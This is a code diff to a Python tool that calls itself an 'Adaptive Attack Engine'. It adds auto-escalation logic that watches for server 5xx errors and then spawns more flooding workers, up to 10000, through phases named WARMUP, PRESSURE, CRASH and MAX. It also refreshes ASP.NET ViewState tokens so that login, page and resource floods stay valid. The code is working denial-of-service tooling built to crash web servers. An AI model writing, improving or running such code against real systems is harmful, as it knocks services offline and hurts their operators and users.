@@ -459,10 +459,15 @@ class VFTester:
         # ASP.NET specific
         self._viewstate_cache: Dict[str, str] = {}
         self._viewstate_ts: float = 0
-        self._viewstate_ttl: float = 10.0
+        self._viewstate_ttl: float = 5.0  # Refresh more often to avoid stale tokens
         self._viewstate_lock = asyncio.Lock()
         self.username_field = p.get("login_fields", {}).get("username", "username")
         self.password_field = p.get("login_fields", {}).get("password", "password")
+
+        # Per-session ASP.NET token tracking
+        self._session_cookies: Dict[int, Dict[str, str]] = {}  # worker_id -> cookies
+        self._invalid_count: int = 0
+        self._invalid_threshold: int = 5  # Force full refresh after N invalid responses
 
         # Targets from profile
         self.page_targets: List[str] = self.attack.get("page_targets", [])
@@ -501,8 +506,8 @@ class VFTester:
                         "viewstate_present": False, "technologies": []}
         self.attack = {"recommended_strategy": "GENERIC_FLOOD",
                        "attack_vectors": ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"],
-                       "worker_config": {"initial_workers": 200, "max_workers": 10000,
-                                         "step": 300, "step_duration": 3, "ramp_strategy": "GRADUAL"},
+                       "worker_config": {"initial_workers": 10, "max_workers": 10000,
+                                         "step": 50, "step_duration": 5, "ramp_strategy": "GRADUAL"},
                        "page_targets": [], "resource_targets": [],
                        "waf_strategy": {"detected": False},
                        "request_config": {"delay_between_requests_ms": 5},
@@ -530,9 +535,20 @@ class VFTester:
         return headers
 
     async def _refresh_viewstate(self, session):
+        """Refresh ASP.NET ViewState/EventValidation tokens.
+        
+        Uses a lock to avoid hammering the server with GET requests.
+        When 'invalid user client' is detected, forces immediate refresh.
+        """
         async with self._viewstate_lock:
             now = time.time()
-            if now - self._viewstate_ts > self._viewstate_ttl or not self._viewstate_cache:
+            force_refresh = (
+                now - self._viewstate_ts > self._viewstate_ttl or
+                not self._viewstate_cache or
+                self._invalid_count >= self._invalid_threshold
+            )
+            if force_refresh:
+                self._invalid_count = 0
                 try:
                     async with session.get(self.url, headers=self._base_headers(),
                                            ssl=False, allow_redirects=True) as resp:
@@ -574,7 +590,8 @@ class VFTester:
                     elapsed = time.time() - t
                     # Detect "invalid" in response — force ViewState refresh
                     if "invalid" in body.lower():
-                        self._viewstate_ts = 0
+                        self._invalid_count += 1
+                        self._viewstate_ts = 0  # Force immediate refresh
                     result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                       mode="login", hint=f"Login {resp.status}", url=self.url)
                     await self.live_log.add("login", resp.status, elapsed, None, self.url, result.hint)
@@ -870,7 +887,8 @@ class VFTester:
                     elapsed = time.time() - t
                     # Detect "invalid" in response — force ViewState refresh
                     if "invalid" in body.lower():
-                        self._viewstate_ts = 0
+                        self._invalid_count += 1
+                        self._viewstate_ts = 0  # Force immediate refresh
                     vs_size = len(hidden_fields.get('__VIEWSTATE', ''))
                     result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                       mode="viewstate", hint=f"VS {resp.status} ({vs_size}B)", url=self.url)
@@ -1084,7 +1102,8 @@ class VFTester:
         all_tasks.append(t)
 
     def _render_dashboard(self, cur, max_w, step, mode, health, trend,
-                          step_dur, step_remaining, strategy):
+                          step_dur, step_remaining, strategy,
+                          escalation_phase_display="", new_5xx=0):
         if health > 0.7: hc = C.G
         elif health > 0.4: hc = C.Y
         else: hc = C.R
@@ -1105,12 +1124,14 @@ class VFTester:
         waf_s = f" WAF:{self.detected_waf}" if self.detected_waf else ""
         cms_s = f" CMS:{self.detected_cms}" if self.detected_cms else ""
         asp_s = " ASP.NET" if self.is_aspnet else ""
+        esc_s = f" | Phase:{escalation_phase_display}" if escalation_phase_display else ""
+        err5xx_s = f" {C.R}5xx:{new_5xx}{C.RS}" if new_5xx > 0 else ""
 
         line1 = (f"  {mode_display} | {C.CY}{self.stats.dur:.0f}s{C.RS} | "
                 f"W:{cur:,}/{max_w:,} | "
                 f"Total:{self.stats.total:,} | "
-                f"{C.G}OK:{self.stats.ok:,}{C.RS} {C.R}FAIL:{self.stats.fail:,}{C.RS} | "
-                f"RPS:{rps:.0f}/s | {C.M}{strategy}{C.RS}{waf_s}{cms_s}{asp_s}")
+                f"{C.G}OK:{self.stats.ok:,}{C.RS} {C.R}FAIL:{self.stats.fail:,}{C.RS}{err5xx_s} | "
+                f"RPS:{rps:.0f}/s | {C.M}{strategy}{C.RS}{waf_s}{cms_s}{asp_s}{esc_s}")
 
         line2 = (f"  Health:{bar} {hc}{health:.0%}{C.RS} {trend_icon} | "
                 f"RT:{self.stats.rart*1000:.0f}ms | "
@@ -1151,6 +1172,13 @@ class VFTester:
 
         actual_max = self.max_workers
 
+        # ═══ AUTO-ESCALATION ═══
+        # Start LOW, gradually increase pressure until server errors appear
+        escalation_phase = "WARMUP"  # WARMUP -> RAMP -> PRESSURE -> CRASH -> MAX
+        prev_5xx_count = 0
+        first_5xx_seen = False
+        consecutive_5xx_steps = 0  # How many steps in a row we've seen 5xx
+
         # Print startup banner
         print(f"\n{'='*72}")
         print(f"  {C.BD}{C.R}VF_TESTER — Adaptive Attack Engine{C.RS}")
@@ -1164,6 +1192,7 @@ class VFTester:
         print(f"  Vectors:  {', '.join(vectors)}")
         print(f"  Workers:  {C.BD}{actual_max:,}{C.RS} (initial: {self.initial_workers}, step: +{self.step})")
         print(f"  Pages:    {len(pages)} | Resources: {len(resources)}")
+        print(f"  Mode:     {C.Y}AUTO-ESCALATE — gradually increasing pressure{C.RS}")
         print(f"  Controls: {C.BD}[+]{C.RS} Add workers  {C.BD}[-]{C.RS} Remove  {C.BD}[q]{C.RS} Quit")
         print(f"{'='*72}\n")
 
@@ -1187,7 +1216,7 @@ class VFTester:
             all_tasks = []
             cur = 0
 
-            # Initial workers
+            # Initial workers — start LOW for auto-escalation
             for _ in range(self.initial_workers):
                 delay = random.uniform(0, 2.0)
                 self._spawn_worker(session, all_tasks, vectors, pages, resources, delay=delay)
@@ -1204,9 +1233,52 @@ class VFTester:
                     self._stop.set()
                     break
 
-                # Smart Crash Mode
+                # ═══ AUTO-ESCALATION LOGIC ═══
+                # Check for 5xx server errors in recent responses
+                current_5xx = sum(self.stats.codes.get(c, 0) for c in (500, 502, 503, 504))
+                new_5xx = current_5xx - prev_5xx_count
+                prev_5xx_count = current_5xx
+
+                if new_5xx > 0:
+                    if not first_5xx_seen:
+                        first_5xx_seen = True
+                        print(f"\n  {C.BD}{C.Y}[5xx FIRST] First server error detected! Server is starting to struggle.{C.RS}")
+                    consecutive_5xx_steps += 1
+                    escalation_phase = "PRESSURE"
+                else:
+                    consecutive_5xx_steps = max(0, consecutive_5xx_steps - 1)
+
+                # Calculate auto-escalation step based on phase
+                if escalation_phase == "WARMUP":
+                    # WARMUP: gradual increase, small steps
+                    auto_step = self.step
+                    escalation_phase_display = f"{C.G}WARMUP{C.RS}"
+                elif escalation_phase == "PRESSURE":
+                    # PRESSURE: 5xx detected, increase faster
+                    auto_step = self.step * 2
+                    escalation_phase_display = f"{C.Y}PRESSURE{C.RS}"
+                    if consecutive_5xx_steps >= 3:
+                        escalation_phase = "CRASH"
+                elif escalation_phase == "CRASH":
+                    # CRASH: many 5xx errors, hit hard
+                    auto_step = self.step * 4
+                    escalation_phase_display = f"{C.R}CRASH{C.RS}"
+                    if consecutive_5xx_steps >= 5:
+                        escalation_phase = "MAX"
+                elif escalation_phase == "MAX":
+                    # MAX: server is dying, maximum pressure
+                    auto_step = self.step * 6
+                    escalation_phase_display = f"{C.BD}{C.R}MAX{C.RS}"
+                else:
+                    auto_step = self.step
+                    escalation_phase_display = f"{C.G}WARMUP{C.RS}"
+
+                # Smart Crash Mode (from health monitor)
                 mode, worker_delta = self.health_monitor.get_pressure_advice(
                     cur, actual_max, self.step)
+
+                # Use the LARGER of auto-escalation step or health monitor advice
+                effective_delta = max(auto_step, worker_delta)
 
                 # Manual delta
                 if self._manual_delta > 0:
@@ -1226,29 +1298,28 @@ class VFTester:
                         cur -= remove_count
                     self._manual_delta = 0
 
-                # Apply crash mode
-                if worker_delta > 0 and cur < actual_max:
-                    new = min(worker_delta, actual_max - cur)
+                # Apply auto-escalation
+                if effective_delta > 0 and cur < actual_max:
+                    new = min(effective_delta, actual_max - cur)
                     if new > 0:
                         cur += new
-                        if mode == "MAXIMUM":
+                        if escalation_phase == "MAX":
                             print(f"\n  {C.BD}{C.R}[!!!] SERVER DYING — MAXIMUM PRESSURE +{new} -> {cur:,}{C.RS}")
-                        elif mode == "CRASH":
+                        elif escalation_phase == "CRASH":
                             print(f"\n  {C.R}[CRASH] Server failing — +{new} workers -> {cur:,}{C.RS}")
-                        elif mode == "PRESSURE":
+                        elif escalation_phase == "PRESSURE":
                             print(f"\n  {C.Y}[PRESS] Server struggling — +{new} workers -> {cur:,}{C.RS}")
                         elif mode == "RAMP":
                             print(f"\n  {C.G}[RAMP] Scaling up — +{new} workers -> {cur:,}{C.RS}")
                         for _ in range(new):
                             self._spawn_worker(session, all_tasks, vectors, pages, resources)
 
-                # Detect 5xx server errors and add bonus pressure
-                has_5xx = any(code in self.stats.codes for code in (502, 503, 504))
-                if has_5xx:
-                    bonus = min(int(self.step * 0.5), actual_max - cur)
+                # Bonus pressure when 5xx detected in current step
+                if new_5xx > 0:
+                    bonus = min(int(self.step * 0.5 * (1 + consecutive_5xx_steps)), actual_max - cur)
                     if bonus > 0:
                         cur += bonus
-                        print(f"\n  {C.BD}{C.R}[5xx DETECTED] Server errors found! Increasing pressure... +{bonus} -> {cur:,}{C.RS}")
+                        print(f"\n  {C.BD}{C.R}[5xx x{new_5xx}] Server errors! Escalating pressure... +{bonus} -> {cur:,}{C.RS}")
                         for _ in range(bonus):
                             self._spawn_worker(session, all_tasks, vectors, pages, resources)
 
@@ -1262,7 +1333,9 @@ class VFTester:
                     step_remaining = self.step_duration - (time.time() - step_t0)
                     line1, line2, line3, log_display = self._render_dashboard(
                         cur, actual_max, self.step, mode, health, trend,
-                        self.step_duration, step_remaining, strategy)
+                        self.step_duration, step_remaining, strategy,
+                        escalation_phase_display=escalation_phase_display,
+                        new_5xx=new_5xx)
 
                     total_lines = 3 + 8 + 2
                     sys.stdout.write(f"\033[{total_lines}A")
